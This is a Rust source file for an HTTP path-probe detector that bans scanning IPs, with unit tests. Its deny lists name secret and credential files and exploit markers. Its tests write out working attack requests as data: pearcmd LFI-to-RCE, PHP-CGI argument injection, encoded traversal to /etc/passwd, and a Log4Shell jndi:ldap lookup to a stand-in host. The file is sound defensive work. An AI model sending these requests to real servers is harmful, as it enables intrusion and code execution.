use std::net::IpAddr;
use std::time::Duration;

use ipnet::IpNet;

use crate::detector::Detector;
use crate::detectors::netkey::source_key;
use crate::models::{Action, DetectionSignal, EventType, NormalizedEvent};

/// Default prefix paths (`starts_with` on the raw request target).
pub fn default_probe_paths() -> Vec<String> {
    ["/wp-login.php", "/xmlrpc.php", "/.env", "/phpmyadmin", "/wp-admin"]
        .iter()
        .map(|s| s.to_string())
        .collect()
}

/// Default segment patterns: matched case-insensitively anywhere in the path
/// (query excluded, also after one percent-decode), only on a segment
/// boundary — the pattern must start a path segment and be followed by the
/// end of the path or one of `/ . - _ ~`. So `/.git` catches
/// `/kontakt/.git/config` and `/.git-credentials` but not `/.github/` or
/// `/.gitignore-tips`; `/.env` catches `/app/.env.bak` but not `/.environment`.
pub fn default_segment_paths() -> Vec<String> {
    [
        "/.git",
        "/.svn",
        "/.hg",
        "/.env",
        "/.aws",
        "/.ssh",
        "/.DS_Store",
        "/.htpasswd",
        "/vendor/phpunit",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Default query patterns: case-insensitive substrings of the query string,
/// checked on the raw query and after one and two percent-decodes
/// (`%252e%252e%252f` → `%2e%2e%2f` → `../`). Each is an exploit primitive
/// that has no business in a normal query (pearcmd/peclcmd LFI→RCE, PHP-CGI
/// argument injection, path traversal to system files, Log4Shell).
pub fn default_query_patterns() -> Vec<String> {
    [
        "pearcmd",
        "peclcmd",
        "allow_url_include",
        "auto_prepend_file",
        "/etc/passwd",
        "/proc/self/environ",
        "win.ini",
        "..%2f",
        "php://filter",
        "php://input",
        "jndi:",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect()
}

/// Default exact paths (path without query, trailing `/` ignored,
/// case-insensitive): reconnaissance for exposed MCP / OpenAI-compatible LLM
/// endpoints. Exact match only, so `/mcp-news` or `/blog/mcp` never match.
/// Deliberately **not** included: `/.well-known/mcp` and `/llms.txt`
/// (legitimate discovery files AI agents may fetch) and `/sse` (too generic).
pub fn default_exact_paths() -> Vec<String> {
    ["/mcp", "/api/mcp", "/v1/models"].iter().map(|s| s.to_string()).collect()
}

/// Decode `%XX` escapes (invalid escapes are kept verbatim; `+` untouched).
pub fn percent_decode(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hex = |b: u8| (b as char).to_digit(16);
            if let (Some(h), Some(l)) = (hex(bytes[i + 1]), hex(bytes[i + 2])) {
                out.push((h * 16 + l) as u8);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

/// Detects HTTP requests to suspicious/probed paths.
///
/// A single hit produces an immediate detection signal. Four match kinds:
/// `paths` (prefix of the raw target, case-sensitive — the historic
/// behaviour), `segment_paths` (segment anywhere in the path), `query_patterns`
/// (substring of the query after up to two percent-decodes) and `exact_paths`.
pub struct PathProbeDetector {
    paths: Vec<String>,
    /// Lower-cased segment patterns.
    segment_paths: Vec<String>,
    /// Lower-cased query substrings.
    query_patterns: Vec<String>,
    /// Lower-cased exact paths without trailing `/`.
    exact_paths: Vec<String>,
    ban_duration: Duration,
    /// IPv6 ban prefix (128 = per address, the default here).
    ipv6_prefix: u8,
}

impl PathProbeDetector {
    /// All defaults: prefix, segment, query and exact lists.
    pub fn new() -> Self {
        Self::with_config(default_probe_paths(), Duration::from_secs(259200)) // 72h
            .with_extended_matching(
                default_segment_paths(),
                default_query_patterns(),
                default_exact_paths(),
            )
    }

    /// Create with custom prefix paths and ban duration (prefix matching
    /// only; add the other kinds with [`Self::with_extended_matching`]).
    pub fn with_config(paths: Vec<String>, ban_duration: Duration) -> Self {
        Self {
            paths,
            segment_paths: Vec::new(),
            query_patterns: Vec::new(),
            exact_paths: Vec::new(),
            ban_duration,
            ipv6_prefix: 128,
        }
    }

    /// Set the segment / query / exact pattern lists (empty list = off).
    pub fn with_extended_matching(
        mut self,
        segment_paths: Vec<String>,
        query_patterns: Vec<String>,
        exact_paths: Vec<String>,
    ) -> Self {
        let clean = |v: Vec<String>| -> Vec<String> {
            v.into_iter()
                .map(|p| p.trim().to_ascii_lowercase())
                .filter(|p| !p.is_empty())
                .collect()
        };
        self.segment_paths = clean(segment_paths);
        self.query_patterns = clean(query_patterns);
        self.exact_paths = clean(exact_paths)
            .into_iter()
            .map(|p| {
                let t = p.trim_end_matches('/');
                if t.is_empty() { "/".to_string() } else { t.to_string() }
            })
            .collect();
        self
    }

    /// Ban IPv6 sources as this prefix (0 or 128 = per address).
    pub fn with_ipv6_prefix(mut self, prefix: u8) -> Self {
        self.ipv6_prefix = prefix;
        self
    }

    fn compute_evidence_hash(ip: &IpAddr, path: &str) -> [u8; 32] {
        let input = format!("{ip}:path_probe:{path}");
        *blake3::hash(input.as_bytes()).as_bytes()
    }

    /// Check if the given request path matches any suspicious path.
    /// Uses starts_with to catch sub-paths like `/wp-admin/install.php`.
    fn matches_probe_path(&self, request_path: &str) -> Option<&str> {
        for probe in &self.paths {
            if request_path.starts_with(probe.as_str()) {
                return Some(probe.as_str());
            }
        }
        None
    }

    /// Segment match on a lower-cased path (see [`default_segment_paths`]).
    fn segment_match<'a>(patterns: &'a [String], path_lc: &str) -> Option<&'a str> {
        for pat in patterns {
            let mut from = 0;
            while let Some(pos) = path_lc[from..].find(pat.as_str()) {
                let start = from + pos;
                let end = start + pat.len();
                let starts_segment = pat.starts_with('/') || start == 0 || path_lc.as_bytes()[start - 1] == b'/';
                let ends_ok = pat.ends_with('/')
                    || end == path_lc.len()
                    || matches!(path_lc.as_bytes()[end], b'/' | b'.' | b'-' | b'_' | b'~');
                if starts_segment && ends_ok {
                    return Some(pat.as_str());
                }
                from = start + pat.chars().next().map_or(1, char::len_utf8);
                if from >= path_lc.len() {
                    break;
                }
            }
        }
        None
    }

    /// Which pattern (and of which kind) matched the request target.
    fn match_target(&self, target: &str) -> Option<(&'static str, String)> {
        if let Some(p) = self.matches_probe_path(target) {
            return Some(("path", p.to_string()));
        }
        if self.segment_paths.is_empty() && self.query_patterns.is_empty() && self.exact_paths.is_empty() {
            return None;
        }
        let (path, query) = match target.split_once('?') {
            Some((p, q)) => (p, q),
            None => (target, ""),
        };
        let path = path.split('#').next().unwrap_or(path);
        let path_lc = path.to_ascii_lowercase();

        if !self.exact_paths.is_empty() {
            let trimmed = path_lc.trim_end_matches('/');
            let norm = if trimmed.is_empty() { "/" } else { trimmed };
            if let Some(e) = self.exact_paths.iter().find(|e| e.as_str() == norm) {
                return Some(("exact path", e.clone()));
            }
        }
        if !self.segment_paths.is_empty() {
            if let Some(m) = Self::segment_match(&self.segment_paths, &path_lc) {
                return Some(("path segment", m.to_string()));
            }
            if path_lc.contains('%') {
                let decoded = percent_decode(&path_lc).to_ascii_lowercase();
                if let Some(m) = Self::segment_match(&self.segment_paths, &decoded) {
                    return Some(("path segment", m.to_string()));
                }
            }
        }
        if !self.query_patterns.is_empty() && !query.is_empty() {
            let raw = query.to_ascii_lowercase();
            let once = percent_decode(&raw).to_ascii_lowercase();
            let twice = percent_decode(&once).to_ascii_lowercase();
            for pat in &self.query_patterns {
                if raw.contains(pat.as_str()) || once.contains(pat.as_str()) || twice.contains(pat.as_str()) {
                    return Some(("query pattern", pat.clone()));
                }
            }
        }
        None
    }
}

impl Default for PathProbeDetector {
    fn default() -> Self {
        Self::new()
    }
}

impl Detector for PathProbeDetector {
    fn name(&self) -> &str {
        "path_probe"
    }

    fn process(&self, event: &NormalizedEvent) -> Option<DetectionSignal> {
        // Inspect all HTTP events — a probe to a suspicious path is malicious
        // regardless of whether the server returned 200, 404, or 503.
        match event.event_type {
            EventType::HttpRequest | EventType::Http4xx | EventType::Http5xx => {}
            _ => return None,
        }

        let request_path = event.metadata.get("path")?;
        let (kind, matched) = self.match_target(request_path)?;

        let ip = event.source_ip;
        let subject: IpNet = source_key(ip, self.ipv6_prefix);
        let reason = if kind == "path" {
            format!("Path probe: request to suspicious path '{}' from {}", matched, ip)
        } else {
            format!("Path probe: {kind} '{}' matched in request from {}", matched, ip)
        };
        let evidence_hash = Self::compute_evidence_hash(&ip, &matched);

        Some(DetectionSignal {
            source_ip: subject,
            severity: 200,
            confidence: 0.95,
            reason,
            evidence_hash,
            suggested_action: Action::Ban(self.ban_duration),
            detector_name: self.name().to_string(),
            timestamp: event.timestamp,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use std::collections::HashMap;

    fn make_http_event(
        ip: &str,
        path: &str,
        event_type: EventType,
    ) -> NormalizedEvent {
        let mut metadata = HashMap::new();
        metadata.insert("path".to_string(), path.to_string());
        metadata.insert("method".to_string(), "GET".to_string());
        metadata.insert("user_agent".to_string(), "Mozilla/5.0".to_string());
        metadata.insert("status_code".to_string(), "404".to_string());
        NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: ip.parse().unwrap(),
            event_type,
            source_name: "nginx".to_string(),
            raw_line: format!("GET {path} HTTP/1.1"),
            metadata,
        }
    }

    #[test]
    fn wp_login_triggers_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("1.2.3.4", "/wp-login.php", EventType::Http4xx);
        let signal = det.process(&event).expect("should detect wp-login");
        assert_eq!(signal.severity, 200);
        assert_eq!(signal.confidence, 0.95);
        assert_eq!(
            signal.suggested_action,
            Action::Ban(Duration::from_secs(259200))
        );
        assert!(signal.reason.contains("/wp-login.php"));
    }

    #[test]
    fn env_triggers_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("5.6.7.8", "/.env", EventType::Http4xx);
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn xmlrpc_triggers_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("5.6.7.8", "/xmlrpc.php", EventType::HttpRequest);
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn phpmyadmin_triggers_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("5.6.7.8", "/phpmyadmin", EventType::Http4xx);
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn wp_admin_subpath_triggers_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("5.6.7.8", "/wp-admin/install.php", EventType::Http4xx);
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn index_html_no_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("1.2.3.4", "/index.html", EventType::HttpRequest);
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn normal_path_no_signal() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("1.2.3.4", "/api/v1/users", EventType::HttpRequest);
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn auth_failure_event_ignored() {
        let mut det = PathProbeDetector::new();
        let mut metadata = HashMap::new();
        metadata.insert("path".to_string(), "/wp-login.php".to_string());
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::AuthFailure,
            source_name: "ssh".to_string(),
            raw_line: "test".to_string(),
            metadata,
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn http5xx_also_detected() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("1.2.3.4", "/wp-login.php", EventType::Http5xx);
        let signal = det.process(&event);
        assert!(signal.is_some(), "Http5xx probe should be detected");
    }

    #[test]
    fn missing_path_metadata_no_signal() {
        let mut det = PathProbeDetector::new();
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::Http4xx,
            source_name: "nginx".to_string(),
            raw_line: "test".to_string(),
            metadata: HashMap::new(),
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn custom_paths_config() {
        let mut det = PathProbeDetector::with_config(
            vec!["/secret".into(), "/admin".into()],
            Duration::from_secs(3600),
        );
        let event = make_http_event("1.2.3.4", "/secret", EventType::Http4xx);
        let signal = det.process(&event).expect("custom path should trigger");
        assert_eq!(
            signal.suggested_action,
            Action::Ban(Duration::from_secs(3600))
        );
    }

    // --- Phase 10: comprehensive coverage ---

    #[test]
    fn path_is_case_sensitive() {
        let mut det = PathProbeDetector::new();
        // /wp-login.php should match, /WP-LOGIN.PHP should NOT
        let event_lower = make_http_event("1.2.3.4", "/wp-login.php", EventType::Http4xx);
        assert!(det.process(&event_lower).is_some());

        let event_upper = make_http_event("1.2.3.4", "/WP-LOGIN.PHP", EventType::Http4xx);
        assert!(det.process(&event_upper).is_none());
    }

    #[test]
    fn path_with_query_string() {
        let mut det = PathProbeDetector::new();
        // /wp-login.php?action=login starts with /wp-login.php
        let event = make_http_event("1.2.3.4", "/wp-login.php?action=login", EventType::Http4xx);
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn path_with_fragment() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("1.2.3.4", "/.env.bak", EventType::Http4xx);
        assert!(det.process(&event).is_some()); // starts with /.env
    }

    #[test]
    fn phpmyadmin_subpath() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("1.2.3.4", "/phpmyadmin/index.php", EventType::Http4xx);
        assert!(det.process(&event).is_some());
    }

    #[test]
    fn similar_but_not_matching_path() {
        let mut det = PathProbeDetector::new();
        // /wp-content is NOT /wp-login.php or /wp-admin
        let event = make_http_event("1.2.3.4", "/wp-content/themes/style.css", EventType::HttpRequest);
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn ipv6_path_probe() {
        let mut det = PathProbeDetector::new();
        let event = make_http_event("2001:db8::1", "/wp-login.php", EventType::Http4xx);
        let signal = det.process(&event).expect("should detect");
        assert!(signal.source_ip.addr().to_string().contains("2001:db8"));
    }

    #[test]
    fn multiple_probes_same_ip() {
        let mut det = PathProbeDetector::new();
        // Each probe generates a signal independently (threshold=1)
        let event1 = make_http_event("1.2.3.4", "/wp-login.php", EventType::Http4xx);
        assert!(det.process(&event1).is_some());

        let event2 = make_http_event("1.2.3.4", "/.env", EventType::Http4xx);
        assert!(det.process(&event2).is_some());

        let event3 = make_http_event("1.2.3.4", "/xmlrpc.php", EventType::HttpRequest);
        assert!(det.process(&event3).is_some());
    }

    #[test]
    fn evidence_hash_differs_for_different_paths() {
        let mut det = PathProbeDetector::new();
        let event1 = make_http_event("1.2.3.4", "/wp-login.php", EventType::Http4xx);
        let signal1 = det.process(&event1).unwrap();

        let event2 = make_http_event("1.2.3.4", "/.env", EventType::Http4xx);
        let signal2 = det.process(&event2).unwrap();

        assert_ne!(signal1.evidence_hash, signal2.evidence_hash);
    }

    #[test]
    fn evidence_hash_differs_for_different_ips() {
        let mut det = PathProbeDetector::new();
        let event1 = make_http_event("1.2.3.4", "/wp-login.php", EventType::Http4xx);
        let signal1 = det.process(&event1).unwrap();

        let event2 = make_http_event("5.6.7.8", "/wp-login.php", EventType::Http4xx);
        let signal2 = det.process(&event2).unwrap();

        assert_ne!(signal1.evidence_hash, signal2.evidence_hash);
    }

    #[test]
    fn default_constructor() {
        let det = PathProbeDetector::default();
        assert_eq!(det.name(), "path_probe");
        assert_eq!(det.paths.len(), 5);
        assert_eq!(det.ban_duration, Duration::from_secs(259200));
    }

    #[test]
    fn empty_path_in_metadata() {
        let mut det = PathProbeDetector::new();
        let mut metadata = HashMap::new();
        metadata.insert("path".to_string(), "".to_string());
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::Http4xx,
            source_name: "nginx".to_string(),
            raw_line: "test".to_string(),
            metadata,
        };
        assert!(det.process(&event).is_none());
    }

    #[test]
    fn connection_event_ignored() {
        let mut det = PathProbeDetector::new();
        let event = NormalizedEvent {
            timestamp: Utc::now(),
            source_ip: "1.2.3.4".parse().unwrap(),
            event_type: EventType::ConnectionEvent,
            source_name: "test".to_string(),
            raw_line: "test".to_string(),
            metadata: {
                let mut m = HashMap::new();
                m.insert("path".to_string(), "/wp-login.php".to_string());
                m
            },
        };
        assert!(det.process(&event).is_none());
    }

    // --- 2026-10 hardening: segment / query / exact matching ---

    fn hit(det: &PathProbeDetector, path: &str) -> Option<DetectionSignal> {
        det.process(&make_http_event("100.64.0.9", path, EventType::Http4xx))
    }

    #[test]
    fn segment_paths_match_anywhere_on_boundaries() {
        let det = PathProbeDetector::new();
        for p in [
            "/kontakt/.git/config",
            "/.git/HEAD",
            "/app/.env",
            "/app/.env.bak",
            "/static/.DS_Store",
            "/old/.svn/entries",
            "/x/.aws/credentials",
            "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/a/%2egit/config",
            "/.git-credentials",
        ] {
            let s = hit(&det, p).unwrap_or_else(|| panic!("{p} must match"));
            assert_eq!(s.detector_name, "path_probe");
        }
        for p in [
            "/.github/workflows",
            "/blog/.gitignore-tips",
            "/docs/.environment",
            "/environment/.envelope",
            "/vendor/phpunits-guide",
            "/wiadomosci/2026/git-i-svn",
        ] {
            assert!(hit(&det, p).is_none(), "{p} must not match");
        }
    }

    #[test]
    fn query_patterns_catch_encoded_traversal_and_exploits() {
        let det = PathProbeDetector::new();
        for p in [
            "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/",
            "/?pagename=templates%252f%252e%252e%252f%252e%252e%252fusr/lib/php/peclcmd",
            "/cgi-bin/php-cgi?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
            "/page?file=..%2f..%2fetc%2fpasswd",
            "/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "/dl?f=../../windows/WIN.INI",
            "/search?q=${jndi:ldap://x.example/a}",
            "/x?q=%24%7Bjndi%3Aldap%3A%2F%2Fx%7D",
        ] {
            let s = hit(&det, p).unwrap_or_else(|| panic!("{p} must match"));
            assert!(s.reason.contains("query pattern"), "{p}: {}", s.reason);
        }
        for p in [
            "/search?q=etnografia+polska",
            "/cgi-bin/koha/opac-search.pl?q=kw:passwords&sort_by=relevance",
            "/wp-json/batch/v1",
            "/?s=windows+ini+files",
            "/page?ref=../index.html",
        ] {
            assert!(hit(&det, p).is_none(), "{p} must not match");
        }
    }

    #[test]
    fn exact_paths_only_match_exactly() {
        let det = PathProbeDetector::new();
        for p in ["/mcp", "/mcp/", "/MCP", "/api/mcp", "/v1/models", "/v1/models?x=1"] {
            assert!(hit(&det, p).is_some(), "{p} must match");
        }
        for p in [
            "/mcp-news",
            "/blog/mcp",
            "/mcp/tools/list",
            "/.well-known/mcp",
            "/llms.txt",
            "/sse",
            "/v1/models/extra",
        ] {
            assert!(hit(&det, p).is_none(), "{p} must not match");
        }
    }

    #[test]
    fn legacy_with_config_is_prefix_only() {
        let det = PathProbeDetector::with_config(vec!["/secret".into()], Duration::from_secs(60));
        assert!(hit(&det, "/kontakt/.git/config").is_none());
        assert!(hit(&det, "/mcp").is_none());
        assert!(hit(&det, "/x?f=/etc/passwd").is_none());
    }

    #[test]
    fn ipv6_prefix_widens_ban_subject() {
        let det = PathProbeDetector::new();
        let ev = make_http_event("2001:db8:1:2::77", "/.env", EventType::Http4xx);
        assert_eq!(det.process(&ev).unwrap().source_ip.prefix_len(), 128);
        let det = PathProbeDetector::new().with_ipv6_prefix(64);
        assert_eq!(det.process(&ev).unwrap().source_ip.to_string(), "2001:db8:1:2::/64");
    }

    #[test]
    fn percent_decode_handles_edge_cases() {
        assert_eq!(percent_decode("%2e%2E%2f"), "../");
        assert_eq!(percent_decode("%"), "%");
        assert_eq!(percent_decode("%zz%4"), "%zz%4");
        assert_eq!(percent_decode("a%252fb"), "a%2fb");
        // Multi-byte input must not panic.
        let det = PathProbeDetector::new();
        assert!(hit(&det, "/zażółć/gęślą?q=jaźń").is_none());
    }
}
